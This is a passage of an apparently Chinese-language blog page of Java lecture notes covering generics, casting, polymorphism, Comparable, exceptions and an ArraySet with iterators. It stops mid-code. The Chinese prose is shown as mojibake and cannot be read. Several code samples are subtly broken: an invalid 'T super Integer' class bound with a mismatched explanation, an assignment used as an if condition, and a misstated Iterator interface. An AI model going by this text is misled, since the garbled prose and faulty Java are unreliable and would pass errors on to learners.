 <p>åœ¨è¿™ä¸ªä¾‹å­ä¸­ï¼Œç±»å‹å‚æ•° T å¿…é¡»æ˜¯ Number ç±»æˆ–å…¶å­ç±»ï¼Œè¿™æ„å‘³ç€å¯ä»¥ä¼ é€’ Integerã€Doubleã€Float ç­‰ç±»å‹ä½œä¸º Tã€‚</p>          </div><ol start="2"><li>ä¸‹ç•Œé™å®šï¼šä½¿ç”¨ super å…³é”®å­—æŒ‡å®šç±»å‹å‚æ•°å¿…é¡»æ˜¯æŸä¸ªç±»çš„è¶…ç±»ã€‚ä¾‹å¦‚ï¼š</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">class</span> <span class="hljs-title class_">MyClass</span>&lt;T <span class="hljs-built_in">super</span> Integer&gt; &#123;<br>    ...<br>&#125;<br></code></pre></td></tr></table></figure><div class="note note-info">            <p>åœ¨è¿™ä¸ªä¾‹å­ä¸­ï¼Œç±»å‹å‚æ•° T å¿…é¡»æ˜¯ Number ç±»æˆ–å…¶å­ç±»ï¼Œè¿™æ„å‘³ç€å¯ä»¥ä¼ é€’ Integerã€Doubleã€Float ç­‰ç±»å‹ä½œä¸º Tã€‚</p>          </div><h3 id="Encapsulation"><a href="#Encapsulation" class="headerlink" title="Encapsulation"></a>Encapsulation</h3><p>åœ¨ç¼–å†™ä»£ç çš„è¿‡ç¨‹ä¸­ï¼Œç»´æŒä»£ç çš„ <em>Abstraction Barriers</em> æ˜¯éå¸¸é‡è¦çš„ï¼ï¼ˆæ¢¦å›61aï¼‰</p><p>åœ¨Javaä¸­ï¼Œæˆ‘ä»¬å¯ä»¥è½»æ˜“åœ°å®ç°æŠ½è±¡éšœç¢ï¼Œæ¯”å¦‚ä½¿ç”¨privateå…³é”®å­—ã€‚</p><p>ä½†æ˜¯ç»§æ‰¿å¯ä»¥ç ´åè¿™ç§å°è£…ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">bark</span><span class="hljs-params">()</span> &#123;<br>    barkMany(<span class="hljs-number">1</span>);<br>&#125;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">barkMany</span><span class="hljs-params">(<span class="hljs-type">int</span> N)</span> &#123;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; N; i += <span class="hljs-number">1</span>) &#123;<br>        System.out.println(<span class="hljs-string">&quot;bark&quot;</span>);<br>    &#125;<br>&#125;<br><br><span class="hljs-meta">@Override</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">barkMany</span><span class="hljs-params">(<span class="hljs-type">int</span> N)</span> &#123;<br>    System.out.println(<span class="hljs-string">&quot;As a dog, I say: &quot;</span>);<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; N; i += <span class="hljs-number">1</span>) &#123;<br>        bark();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>å‰ä¸¤ä¸ªæ˜¯åŸºç±»ï¼Œç¬¬ä¸‰ä¸ªåˆ™æ˜¯å­ç±»ä¸­çš„éƒ¨åˆ†ã€‚</p><p>è°ƒç”¨å­ç±»ä¸­çš„å‡½æ•°ï¼Œç¨‹åºé™·å…¥æ— é™å¾ªç¯ã€‚å¯¹ bark() çš„è°ƒç”¨å°†è°ƒç”¨ barkMany(1) ï¼Œåè€…åˆè°ƒç”¨ bark() ï¼Œæ— é™æ¬¡åœ°é‡å¤è¯¥è¿‡ç¨‹ã€‚</p><h3 id="Casting"><a href="#Casting" class="headerlink" title="Casting"></a>Casting</h3><p>Java æœ‰ä¸€ç§ç‰¹æ®Šçš„è¯­æ³•ï¼Œæ‚¨å¯ä»¥å‘Šè¯‰ç¼–è¯‘å™¨ç‰¹å®šçš„è¡¨è¾¾å¼å…·æœ‰ç‰¹å®šçš„ç¼–è¯‘æ—¶ç±»å‹ã€‚</p><p>ä¾‹å¦‚ï¼Œæˆ‘ä»¬æœ‰ä¸‹é¢è¿™ä¸ªç±»ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">A</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">A</span><span class="hljs-params">()</span> &#123;&#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">dosomething</span><span class="hljs-params">()</span> &#123;&#125;<br>    <span class="hljs-keyword">public</span> A <span class="hljs-title function_">func</span><span class="hljs-params">(A a)</span> &#123;<span class="hljs-keyword">return</span> a;&#125;<br>&#125;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">B</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">A</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">B</span><span class="hljs-params">()</span> &#123;&#125;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">dosometing</span><span class="hljs-params">()</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;Haha!&quot;</span>)<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">donothing</span><span class="hljs-params">()</span> &#123;&#125;<br>    <span class="hljs-keyword">public</span> B <span class="hljs-title function_">func</span><span class="hljs-params">(B b)</span> &#123;<span class="hljs-keyword">return</span> b;&#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-type">B</span> <span class="hljs-variable">testb</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">B</span>();<br>        <span class="hljs-type">A</span> <span class="hljs-variable">testa</span> <span class="hljs-operator">=</span> testb;<br>        testa.dosomething();<br>        testa.donothing();<br>        <span class="hljs-type">B</span> <span class="hljs-variable">b</span> <span class="hljs-operator">=</span> testa.func(testb);<br><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>æ ¹æ®åŠ¨æ€æ–¹æ³•é€‰æ‹©ï¼Œè°ƒç”¨dosomethingæ—¶ï¼Œæ£€æµ‹åˆ°å­ç±»é‡å†™äº†è¿™ä¸ªæ–¹æ³•ï¼Œæ‰€ä»¥testaæ‰§è¡ŒBä¸­çš„dosomethingå‡½æ•°ã€‚ä½†ç¼–è¯‘å™¨æ ¹æ®å¯¹è±¡çš„é™æ€ç±»å‹ç¡®å®šæŸäº›å†…å®¹æ˜¯å¦æœ‰æ•ˆï¼ŒAä¸­å¹¶æ²¡æœ‰donothingï¼Œæ‰€ä»¥ä¼šå‡ºé”™ã€‚</p><p>åŒæ ·ï¼Œfuncè¿”å›çš„æ˜¯Aç±»å¯¹è±¡ï¼Œä¸èƒ½ç”¨å­ç±»Bç±»çš„å¯¹è±¡ç›´æ¥æ¥æ”¶ã€‚</p><p>æˆ‘ä»¬ä½¿ç”¨castingè§£å†³ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">B</span> <span class="hljs-variable">b</span> <span class="hljs-operator">=</span> (B) testa.func(testb);<br></code></pre></td></tr></table></figure><h3 id="Higher-Order-Function"><a href="#Higher-Order-Function" class="headerlink" title="Higher Order Function"></a>Higher Order Function</h3><p>Pythonä¸­ï¼Œé«˜é˜¶å‡½æ•°æ˜¯ä¸€ä¸ªå¾ˆæœ‰ç”¨çš„å·¥å…·</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">tenX</span>(<span class="hljs-params">x</span>):<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">10</span>*x<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">do_twice</span>(<span class="hljs-params">f,x</span>):<br>    <span class="hljs-keyword">return</span> f(f(x))<br></code></pre></td></tr></table></figure><p>åœ¨Javaä¸­ï¼Œæˆ‘ä»¬å¯ä»¥åˆ©ç”¨æ¥å£ç»§æ‰¿å®ç°é«˜é˜¶å‡½æ•°ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">IntUnaryFunction</span> &#123;<br>    <span class="hljs-type">int</span> <span class="hljs-title function_">apply</span><span class="hljs-params">(<span class="hljs-type">int</span> x)</span>;<br>&#125;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">tenX</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">IntUnaryFunction</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">apply</span><span class="hljs-params">(<span class="hljs-type">int</span> x)</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">10</span> * x;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">do_twice</span><span class="hljs-params">(IntUnaryFunction f, <span class="hljs-type">int</span> x)</span> &#123;<br>        <span class="hljs-keyword">return</span> f.apply(f.apply(x));<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>æœ‰ç‚¹ç±»ä¼¼äºå‡½æ•°å¯¹è±¡ï¼ˆè°“è¯ï¼Œä¼ªå‡½æ•°ï¼‰çš„å®ç°ã€‚</p><h2 id="Subtype-Polymorphism"><a href="#Subtype-Polymorphism" class="headerlink" title="Subtype Polymorphism"></a>Subtype Polymorphism</h2><p>åœ¨Javaä¸­ï¼Œå¤šæ€æ€§æ˜¯æŒ‡å¯¹è±¡å¯ä»¥å…·æœ‰å¤šç§å½¢å¼æˆ–ç±»å‹ã€‚åœ¨OOPä¸­ï¼Œå¤šæ€æ€§æ¶‰åŠå¦‚ä½•å°†å¯¹è±¡è§†ä¸ºå…¶è‡ªèº«çš„å®ä¾‹ã€å…¶è¶…ç±»çš„å®ä¾‹ã€å…¶è¶…ç±»çš„è¶…ç±»çš„å®ä¾‹ã€‚</p><p>å€Ÿç”±å¤šæ€å’Œæ¥å£ç»§æ‰¿ï¼Œæˆ‘ä»¬å¯ä»¥å°è¯•å®ç°è¿ç®—ç¬¦é‡è½½ï¼Œå°½ç®¡åœ¨Javaä¸­æ²¡æœ‰ä¸“é—¨çš„æ“ä½œã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">OurComparable</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">compareTo</span><span class="hljs-params">(Object o)</span>;<br>&#125;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Dog</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">OurComparable</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> weight;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Dog</span><span class="hljs-params">(<span class="hljs-type">int</span> w)</span> &#123;<br>        weight = w;<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">compareTo</span><span class="hljs-params">(Object o)</span> &#123;<br>        <span class="hljs-type">Dog</span> <span class="hljs-variable">another</span> <span class="hljs-operator">=</span> (Dog) o;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-built_in">this</span>.weight &lt; another.weight) &#123;<br>            <span class="hljs-keyword">return</span> -<span class="hljs-number">1</span>;<br>        &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (<span class="hljs-built_in">this</span>.weight = another.weight) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>è¿™æ ·è¿›è¡Œæ“ä½œåï¼Œå‡è®¾æˆ‘ä»¬æœ‰å…¶ä»–ç±»ï¼Œä¹Ÿå¯ä»¥è¿™æ ·è¿›è¡Œæ¯”è¾ƒã€‚å¦‚è¿›è¡ŒDogå’ŒCatä¹‹é—´çš„æ¯”è¾ƒã€‚</p><p>ä½†æ˜¯è¿™æ ·ä¾ç„¶æœ‰ç¼ºé™·ï¼Œå³å¼ºåˆ¶ç±»å‹è½¬æ¢æ—¶ï¼Œå¯èƒ½ä¼šå‡ºé”™ã€‚è¿™æ—¶æˆ‘ä»¬è€ƒè™‘ä½¿ç”¨æ³›å‹ã€‚</p><p>javaä¸­å·²ç»ä¸ºæˆ‘ä»¬æä¾›äº†æ¥å£ Comparableï¼Œæ•…æˆ‘ä»¬åªéœ€è¦å®ç°</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Dog</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Comparable</span>&lt;Dog&gt; &#123;<br>    ...<br>    <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">compareTo</span><span class="hljs-params">(Dog another)</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>.weight - another.weight;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="Exceptions-Iterators-Object-Methods"><a href="#Exceptions-Iterators-Object-Methods" class="headerlink" title="Exceptions, Iterators, Object Methods"></a>Exceptions, Iterators, Object Methods</h1><h2 id="Lists-Sets-ArraySet"><a href="#Lists-Sets-ArraySet" class="headerlink" title="Lists, Sets, ArraySet"></a>Lists, Sets, ArraySet</h2><p>Javaä¸ºæˆ‘ä»¬æä¾›äº†å†…ç½®çš„Listæ¥å£å’Œå¤šç§å®ç°ï¼Œä¾‹å¦‚Arraylistã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">java.util.List&lt;Integer&gt; L = <span class="hljs-keyword">new</span> <span class="hljs-title class_">java</span>.util.ArrayList&lt;&gt;();<br></code></pre></td></tr></table></figure><p>é›†åˆæ˜¯å”¯ä¸€å…ƒç´ çš„é›†åˆï¼Œæ¯ä¸ªå…ƒç´ åªèƒ½æœ‰ä¸€ä¸ªå‰¯æœ¬ï¼Œä¹Ÿæ²¡æœ‰é¡ºåºã€‚Java å…·æœ‰ Set æ¥å£ä»¥åŠå®ç°ï¼Œä¾‹å¦‚ HashSet ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.util.Set;<br><span class="hljs-keyword">import</span> java.util.HashSet;<br>Set&lt;String&gt; s = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashSet</span>&lt;&gt;();<br></code></pre></td></tr></table></figure><p>æˆ‘ä»¬çš„ç›®æ ‡æ˜¯ä½¿ç”¨ä»¥ä¸‹æ–¹æ³•åˆ¶ä½œæˆ‘ä»¬è‡ªå·±çš„é›†åˆ ArraySet ï¼š</p><p>add(value) ï¼šå°†å€¼æ·»åŠ åˆ°é›†åˆä¸­ï¼ˆå¦‚æœå°šä¸å­˜åœ¨ï¼‰</p><p>contains(value) ï¼šæ£€æŸ¥ ArraySet æ˜¯å¦åŒ…å«è¯¥å€¼</p><p>size() ï¼šè¿”å›å¤§å°</p><p>ä¸‹é¢æ˜¯ä¸€ä¸ªæ¡†æ¶ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.util.Iterator;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ArraySet</span>&lt;T&gt; <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Iterable</span>&lt;T&gt; &#123;<br>    <span class="hljs-keyword">private</span> T[] items;<br>    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> size; <span class="hljs-comment">// the next item to be added will be at position size</span><br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">ArraySet</span><span class="hljs-params">()</span> &#123;<br>        items = (T[]) <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[<span class="hljs-number">100</span>];<br>        size = <span class="hljs-number">0</span>;<br>    &#125;<br><br>    <span class="hljs-comment">/* Returns true if this map contains a mapping for the specified key.</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">contains</span><span class="hljs-params">(T x)</span> &#123;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; size; i += <span class="hljs-number">1</span>) &#123;<br>            <span class="hljs-keyword">if</span> (items[i].equals(x)) &#123;<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    &#125;<br><br>    <span class="hljs-comment">/* Associates the specified value with the specified key in this map. */</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">add</span><span class="hljs-params">(T x)</span> &#123;<br>        <span class="hljs-keyword">if</span> (contains(x)) &#123;<br>            <span class="hljs-keyword">return</span>;<br>        &#125;<br>        items[size] = x;<br>        size += <span class="hljs-number">1</span>;<br>    &#125;<br><br>    <span class="hljs-comment">/* Returns the number of key-value mappings in this map. */</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">size</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> size;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="Throwing-Exceptions"><a href="#Throwing-Exceptions" class="headerlink" title="Throwing Exceptions"></a>Throwing Exceptions</h2><p>ä¸Šé¢çš„æ¡†æ¶ä¸­æœ‰ä¸€ä¸ªé”™è¯¯ï¼Œå½“æˆ‘ä»¬å°† null æ·»åŠ åˆ° ArraySet æ—¶ï¼Œæˆ‘ä»¬ä¼šå¾—åˆ°ä¸€ä¸ª NullPointerExceptionã€‚</p><p>é—®é¢˜åœ¨äº contains æ–¹æ³•ï¼Œæˆ‘ä»¬åœ¨å…¶ä¸­æ£€æŸ¥ items[i].equals(x) ã€‚å¦‚æœ items[i] å¤„çš„å€¼ä¸º nullï¼Œåˆ™æˆ‘ä»¬å°†è°ƒç”¨ null.equals(x) -&gt; NullPointerExceptionã€‚</p><p>åœ¨Javaä¸­ï¼Œæˆ‘ä»¬ä½¿ç”¨å…³é”®å­— throw æ¥æŠ›å‡ºå¼‚å¸¸ï¼Œè¯­æ³•æ ¼å¼ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ExceptionObject</span>(parameter1, ...)<br></code></pre></td></tr></table></figure><p>æ›´æ–°åçš„addæ–¹æ³•ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">add</span><span class="hljs-params">(T x)</span> &#123;<br>    <span class="hljs-keyword">if</span> (x == <span class="hljs-literal">null</span>) &#123;<br>        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">IllegalArgumentException</span>(<span class="hljs-string">&quot;Can&#x27;t add null&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">if</span> (contains(x)) &#123;<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br>    items[size] = x;<br>    size += <span class="hljs-number">1</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>å’ŒC++ä¸€æ ·ï¼Œæˆ‘ä»¬ä¹Ÿå¯ä»¥ä½¿ç”¨tryã€catch è¯­å¥æ¥è¿›è¡Œå¼‚å¸¸çš„æ•è·ï¼ˆæ­¤å¤„ç•¥ï¼‰</p><h2 id="Iteration"><a href="#Iteration" class="headerlink" title="Iteration"></a>Iteration</h2><p>for each å¾ªç¯ï¼š</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">for</span> (object : container) &#123;<br>    <span class="hljs-comment">// body of loop</span><br>&#125;<br></code></pre></td></tr></table></figure><p>è¿™ç§å¾ªç¯æ˜¯å°†containerä¸­çš„æ¯ä¸ªobjectè¿›å…¥å¾ªç¯ä½“ä¸­æ‰§è¡Œè¯­å¥ï¼Œæ”¯æŒè¿™ç§å¾ªç¯çš„å…³é”®æ˜¯è¿­ä»£å™¨ã€‚</p><p>åœ¨Javaä¸­ï¼Œé€šè¿‡å®ç°å†…ç½®çš„ Iterable æ¥å£ï¼Œæˆ‘ä»¬å¯ä»¥å®ç°è‡ªå·±çš„è¿­ä»£å™¨ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">Iterator</span>&lt;T&gt; &#123;<br>    Iterator&lt;T&gt; <span class="hljs-title function_">iterator</span><span class="hljs-params">()</span>;<br>    <span class="hljs-type">boolean</span> <span class="hljs-title function_">hasNext</span><span class="hljs-params">()</span>;<br>    T <span class="hljs-title function_">next</span><span class="hljs-params">()</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>æ”¯æŒè¿­ä»£å™¨çš„ ArraySet å¦‚ä¸‹ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.util.Iterator;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ArraySet</span>&lt;T&gt; <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Iterable</span>&lt;T&gt; &#123;<br>    <span class="hljs-keyword">private</span> T[] items;<br>    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> size; <span class="hljs-comment">// the next item to be added will be at position size</span><br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">ArraySet</span><span class="hljs-params">()</span> &#123;<br>        items = (T[]) <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[<span class="hljs-number">100</span>];<br>        size = <span class="hljs-number">0</span>;<br>    &#125;<br><br>    <span class="hljs-comment">/* Returns true if this map contains a mapping for the specified key.</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">contains</span><span class="hljs-params">(T x)</span> &#123;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; size; i += <span class="hljs-number">1</span>) &#123;<br>            <span class="hljs-keyword">if</span> (items[i].equals(x)) &#123;<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    &#125;<br><br>    <span class="hljs-comment">/* Associates the specified value with the specified key in this map.</span><br><span class="hljs-comment">       Throws an IllegalArgumentException if the key is null. */</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">add</span><span class="hljs-params">(T x)</span> &#123;<br>        <span class="hljs-keyword">if</span> (x == <span class="hljs-literal">null</span>) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">IllegalArgumentException</span>(<span class="hljs-string">&quot;can&#x27;t add null&quot;</span>);<br>        &#125;<br>        <span class="hljs-keyword">if</span> (contains(x)) &#123;<br>            <span class="hljs-keyword">return</span>;<br>        &#125;<br>        items[size] = x;<br>        size += <span class="hljs-number">1</span>;<br>    &#125;<br><br>    <span class="hljs-comment">/* Returns the number of 